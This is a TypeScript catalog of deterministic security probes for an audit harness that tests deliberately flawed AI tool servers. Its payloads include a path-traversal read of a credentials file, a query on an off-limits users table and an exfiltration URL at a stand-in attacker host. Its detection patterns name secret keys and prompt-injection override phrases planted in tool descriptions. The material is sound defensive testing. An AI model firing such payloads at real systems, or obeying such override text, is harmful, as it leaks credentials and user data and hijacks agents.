// payloads.ts — static SAFE-T probe catalog for the six specialist probers.
//
// Each entry is ONE SAFE-T probe class targeting a KNOWN seeded flaw in the
// target server (see ../../target-server/SEEDED_FLAWS.md). Probes are fully
// DETERMINISTIC — no LLM. Each class carries:
//   - a stable `prober` id (one specialist agent per class)
//   - the SAFE-T technique id it asserts
//   - the tool it probes + a probe payload
//   - a `detect(ctx)` function: response/metadata → finding decision + evidence
//
// The `detect` contract returns either null (no finding) or a finding core
// (severity + evidence excerpt). Detectors read from a ProbeContext that carries
// both the runtime response text AND the tool's advertised description metadata,
// so metadata-only flaws (description poisoning) work without trusting the call.
//
// TODO(stretch, Bedrock): generate payload VARIANTS on top of these static seeds
// via Bedrock/Claude. Out of scope for the 3-hour build — static catalog only.

export type Severity = "low" | "medium" | "high" | "critical";

// Everything a detector is allowed to look at. `responseText` is the flattened
// tool result; `toolDescription` is the advertised tools/list description (the
// only signal a metadata-poisoning probe needs).
export interface ProbeContext {
  responseText: string;
  toolDescription: string;
}

// What a detector returns when it decides a probe is a true finding.
export interface DetectionHit {
  severity: Severity;
  evidence: string; // short excerpt proving the finding
}

// One SAFE-T probe class — the unit a single specialist prober runs.
export interface ProbeClass {
  prober: string; // distinct prober id, e.g. "prober-path-traversal"
  safeT: string; // SAFE-T#### technique id
  probe: string; // human label
  tool: string; // target tool to probe
  severity: Severity; // severity assigned when this class fires
  payload: unknown; // arguments handed to the tool through governance
  // Pull the first matching excerpt out of `s`, trimmed for the evidence field.
  // Returns a DetectionHit if the seeded flaw signal is present, else null.
  detect: (ctx: ProbeContext) => DetectionHit | null;
}

function excerpt(s: string, max = 200): string {
  const flat = s.replace(/\s+/g, " ").trim();
  return flat.length > max ? `${flat.slice(0, max)}…` : flat;
}

// Pull the line containing the first regex match (nice human-readable evidence).
function matchLine(s: string, re: RegExp): string | null {
  for (const line of s.split(/\r?\n/)) {
    if (re.test(line)) return excerpt(line);
  }
  return re.test(s) ? excerpt(s) : null;
}

// ───────────────────────────────────────────────────────────────────────────
// The six SAFE-T probe classes. Five target seeded flaws; the sixth is a
// negative control over the clean get_weather tool that must produce ZERO
// findings (proves the probers discriminate, not just always-fire).
// ───────────────────────────────────────────────────────────────────────────
export const PROBE_CLASSES: ProbeClass[] = [
  // 1. PATH TRAVERSAL → read_file (SAFE-T1106)
  // Escape the sandbox to the planted secret; finding if leaked content appears.
  {
    prober: "prober-path-traversal",
    safeT: "SAFE-T1106",
    probe: "path-traversal",
    tool: "read_file",
    severity: "high",
    payload: { path: "../secrets/credentials.txt" },
    detect: ({ responseText }) => {
      const re = /API_KEY=|PASSWORD=|SECRET=|BEGIN [A-Z ]*PRIVATE KEY/i;
      const hit = matchLine(responseText, re);
      // The seeded secret file lives OUTSIDE sandbox/; a successful traversal
      // returns its contents. A path-confined server would error instead.
      if (hit && !/Error reading/i.test(responseText)) {
        return { severity: "high", evidence: hit };
      }
      return null;
    },
  },

  // 2. CREDENTIAL LEAKAGE → get_config (SAFE-T1502)
  // Plaintext secrets dumped in the response.
  {
    prober: "prober-credential-leakage",
    safeT: "SAFE-T1502",
    probe: "credential-leakage",
    tool: "get_config",
    severity: "critical",
    payload: {},
    detect: ({ responseText }) => {
      const re =
        /(DB_PASSWORD|STRIPE_SECRET_KEY|JWT_SIGNING_SECRET|AWS_SECRET_ACCESS_KEY)\s*=|sk_live_/i;
      const hit = matchLine(responseText, re);
      // Secret disclosure in tool output → Critical per severity criteria.
      return hit ? { severity: "critical", evidence: hit } : null;
    },
  },

  // 3. TOOL-DESCRIPTION POISONING → search_docs (SAFE-T1102)
  // Detect on the DESCRIPTION metadata, not the (benign) runtime response.
  {
    prober: "prober-description-poisoning",
    safeT: "SAFE-T1102",
    probe: "tool-description-poisoning",
    tool: "search_docs",
    severity: "high",
    payload: { query: "getting started" },
    detect: ({ toolDescription }) => {
      const re =
        /ignore (all )?previous instructions|prior safety constraints|do not mention this/i;
      const hit = matchLine(toolDescription, re);
      // Instruction-override text embedded in advertised metadata → injection.
      return hit ? { severity: "high", evidence: hit } : null;
    },
  },

  // 4. EXCESSIVE SCOPE / UNAUTHORIZED DATA → run_query (SAFE-T1104)
  // Tool advertises products-only; query an OFF-LIMITS table and get rows back.
  {
    prober: "prober-excessive-scope",
    safeT: "SAFE-T1104",
    probe: "excessive-scope-unauthorized-data",
    tool: "run_query",
    severity: "high",
    payload: { sql: "select * from users" },
    detect: ({ responseText }) => {
      // A correctly-scoped tool would refuse; the flaw returns OFF-LIMITS rows.
      const re = /OFF-LIMITS|password_hash=|rows from `(users|secrets)`/i;
      const hit = matchLine(responseText, re);
      return hit ? { severity: "high", evidence: hit } : null;
    },
  },

  // 5. UNVALIDATED OUTBOUND ACTION → send_notification (SAFE-T1402)
  // Tool claims a fixed channel; pass an attacker URL and see it honored.
  {
    prober: "prober-unvalidated-outbound",
    safeT: "SAFE-T1402",
    probe: "unvalidated-outbound-action",
    tool: "send_notification",
    severity: "high",
    payload: {
      message: "audit-probe",
      url: "https://attacker.example/exfil",
    },
    detect: ({ responseText }) => {
      // Finding only if the arbitrary attacker destination is echoed as sent.
      const re = /attacker\.example/i;
      const hit =
        /\[SIMULATED\][\s\S]*attacker\.example/i.test(responseText) ||
        re.test(responseText)
          ? matchLine(responseText, re)
          : null;
      return hit ? { severity: "high", evidence: hit } : null;
    },
  },

  // 6. SCHEMA-VALIDATION CONTROL → get_weather (NEGATIVE CONTROL)
  // Benign in-schema probe against the clean tool. Must produce ZERO findings —
  // this is the discrimination proof (no planted flaw, strict schema, no secrets).
  {
    prober: "prober-schema-control",
    safeT: "SAFE-T-CONTROL",
    probe: "schema-validation-control",
    tool: "get_weather",
    severity: "low",
    payload: { city: "London" },
    detect: ({ responseText, toolDescription }) => {
      // Assert the control is clean: NONE of the other classes' signals appear,
      // in either the response or the description. Any hit here would be a
      // false positive, which we deliberately do not produce.
      const flawSignals =
        /API_KEY=|PASSWORD=|SECRET=|sk_live_|OFF-LIMITS|attacker\.example|ignore previous instructions|prior safety constraints/i;
      if (flawSignals.test(responseText) || flawSignals.test(toolDescription)) {
        // Should never happen for the seeded clean tool; surface if it ever does.
        return { severity: "low", evidence: excerpt(responseText) };
      }
      return null; // expected path: clean → no finding
    },
  },
];
